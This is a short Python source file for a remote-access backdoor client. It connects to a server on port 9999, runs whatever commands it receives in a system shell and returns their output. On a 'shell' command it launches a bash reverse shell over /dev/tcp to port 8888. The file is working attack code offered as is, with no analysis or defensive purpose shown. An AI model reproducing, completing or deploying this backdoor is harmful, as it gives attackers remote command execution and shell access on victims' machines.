import socket
import time
from colorama import *
import subprocess

BUFFER = 4096


class Client:
    def __init__(self):
        self.sock = 0
        self.cmd = 0
    def processcmd(self):

        if len(self.cmd) > 1:
            print(self.cmd)

            if self.cmd == "shell":
                subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
            
            else:
                j = subprocess.getoutput(self.cmd)
                self.sock.send(j.encode())

    def start(self):
        
        print(Fore.GREEN + "Starting client" + Fore.RESET)

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:

            try:
                self.sock.connect(("127.0.0.1", 9999))
                print(Fore.GREEN + "Connected to server" + Fore.RESET)
                self.sock.send(b"Hey")
                while True:
                    self.cmd = self.sock.recv(BUFFER)
                    
                    self.processcmd()

            except:
                pass
                

c = Client()

c.start()